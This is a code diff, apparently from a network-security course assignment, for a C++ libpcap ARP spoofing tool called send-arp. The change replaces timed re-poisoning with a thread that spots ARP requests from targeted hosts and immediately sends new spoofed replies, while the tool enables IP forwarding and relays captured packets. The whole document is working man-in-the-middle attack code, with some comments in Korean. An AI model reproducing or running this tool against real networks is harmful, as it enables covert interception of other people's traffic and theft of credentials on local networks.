@@ -11,6 +11,8 @@
 #include <thread>
 #include <atomic>
 #include <chrono>
+#include <map>
+#include <mutex>
 #include "ethhdr.h"
 #include "arphdr.h"
 
@@ -22,6 +24,8 @@ struct EthArpPacket final {
 #pragma pack(pop)
 
 std::atomic<bool> stop_flag(false);
+std::map<Ip, Ip> target_map; // 송신자 IP를 게이트웨이 IP에 매핑
+std::mutex target_map_mutex;
 
 void usage() {
     printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
@@ -72,27 +76,36 @@ void enableIpForwarding() {
 }
 
 void packetHandler(u_char *userData, const struct pcap_pkthdr* pkthdr, const u_char* packet) {
+    // 패킷 포워딩
     pcap_t* handle = *((pcap_t**)userData);
-    
-    EthHdr* ethHdr = (EthHdr*)packet;
-    if (ntohs(ethHdr->type_) == EthHdr::Ip4) {
-        struct ip* ipHdr = (struct ip*)(packet + sizeof(EthHdr));
-        
-        // Forward the packet
-        if (pcap_sendpacket(handle, packet, pkthdr->len) != 0) {
-            fprintf(stderr, "Error forwarding packet: %s\n", pcap_geterr(handle));
-        }
+    if (pcap_sendpacket(handle, packet, pkthdr->len) != 0) {
+        fprintf(stderr, "Error forwarding packet: %s\n", pcap_geterr(handle));
     }
 }
 
-void reinfectionThread(pcap_t* handle, Mac attackerMac, const std::vector<std::pair<Ip, Ip>>& targets) {
+void broadcastDetectionThread(pcap_t* handle, Mac attackerMac) {
+    struct pcap_pkthdr* header;
+    const u_char* packet;
+    
     while (!stop_flag) {
-        for (const auto& target : targets) {
-            Ip senderIp = target.first;
-            Ip gatewayIp = target.second;
-            sendArpSpoof(handle, attackerMac, senderIp, gatewayIp);
+        int res = pcap_next_ex(handle, &header, &packet);
+        if (res == 0) continue;
+        if (res == -1 || res == -2) break;
+
+        EthHdr* ethHdr = (EthHdr*)packet;
+        if (ntohs(ethHdr->type_) == EthHdr::Arp) {
+            ArpHdr* arpHdr = (ArpHdr*)(packet + sizeof(EthHdr));
+            if (ntohs(arpHdr->op_) == ArpHdr::Request) {
+                Ip senderIp = ntohl(arpHdr->sip_);
+                
+                std::lock_guard<std::mutex> lock(target_map_mutex);
+                auto it = target_map.find(senderIp);
+                if (it != target_map.end()) {
+                    printf("Broadcast ARP request detected from %s. Re-infecting...\n", std::string(senderIp).c_str());
+                    sendArpSpoof(handle, attackerMac, senderIp, it->second);
+                }
+            }
         }
-        std::this_thread::sleep_for(std::chrono::seconds(10)); // Re-infect every 10 seconds
     }
 }
 
@@ -113,30 +126,32 @@ int main(int argc, char* argv[]) {
     }
     
     Mac attackerMac = getAttackerMac(dev);
-    std::vector<std::pair<Ip, Ip>> targets;
+    
     for (int i = 2; i < argc; i += 2) {
-        targets.push_back(std::make_pair(Ip(argv[i]), Ip(argv[i+1])));
-    }
-    
-    enableIpForwarding();
-    
-    for (const auto& target : targets) {
-        Ip senderIp = target.first;
-        Ip gatewayIp = target.second;
+        Ip senderIp = Ip(argv[i]);
+        Ip gatewayIp = Ip(argv[i+1]);
+        {
+            std::lock_guard<std::mutex> lock(target_map_mutex);
+            target_map[senderIp] = gatewayIp;
+        }
         printf("\nSending initial ARP spoof packet: Sender IP %s, Gateway IP %s\n", 
                std::string(senderIp).c_str(), std::string(gatewayIp).c_str());
         sendArpSpoof(handle, attackerMac, senderIp, gatewayIp);
     }
     
-    // Start re-infection thread
-    std::thread reinfection(reinfectionThread, handle, attackerMac, std::ref(targets));
+    enableIpForwarding();
     
-    printf("Starting packet capture and forwarding...\n");
+    printf("Starting broadcast detection thread and packet forwarding...\n");
+    
+    // 브로드캐스트 감지 스레드 시작
+    std::thread detection(broadcastDetectionThread, handle, attackerMac);
+    
+    // 메인 스레드에서 패킷 포워딩 수행
     pcap_loop(handle, 0, packetHandler, (u_char*)&handle);
     
-    // Clean up
+    // 정리
     stop_flag = true;
-    reinfection.join();
+    detection.join();
     pcap_close(handle);
     return 0;
 }
